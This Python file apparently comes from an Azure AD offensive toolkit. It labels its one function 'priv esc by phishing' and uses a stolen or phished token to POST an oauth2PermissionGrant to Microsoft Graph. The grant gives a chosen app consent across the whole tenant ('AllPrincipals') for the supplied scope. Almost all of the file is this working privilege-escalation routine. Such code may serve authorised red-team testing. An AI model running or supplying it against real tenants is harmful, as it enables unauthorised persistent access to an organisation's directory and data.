import requests
import colorama
from colorama import Fore, Style


def OuthDeleg_Vectors(request_headers, OuthDelegSettings):
    print()
    print(
        "Directory.RW.all - Allows the app to read and write data in your organization's directory, such as users, and groups. It does not allow the app to delete users or groups, or reset user passwords.")
    print()
    print()
    print(
        "DelegatedPermissionGrant.ReadWrite.All - Allows the app to manage permission grants for delegated permissions exposed by any API (including Microsoft Graph), on behalf of the signed in user..")
    print()
    try:
        print("Attack vector - priv esc by phishing")

        create_message_URL = "https://graph.microsoft.com/v1.0/oauth2PermissionGrants"
        message_obj = {
            "clientId": OuthDelegSettings["clientId"],
            "consentType": "AllPrincipals",
            "resourceId": OuthDelegSettings["ResourceId"],
            "scope": OuthDelegSettings["permission"]
        }

        result = requests.post(create_message_URL, json=message_obj, headers=request_headers)
        if result.status_code == 201:
            print(Fore.GREEN + "permissions added ")
            print(Style.RESET_ALL)
        elif result.status_code == 409:
            print(Fore.GREEN + "permissions already exists. please use the existing permissions or delete the previous ones.")
            print(Style.RESET_ALL)


    except:
        pass
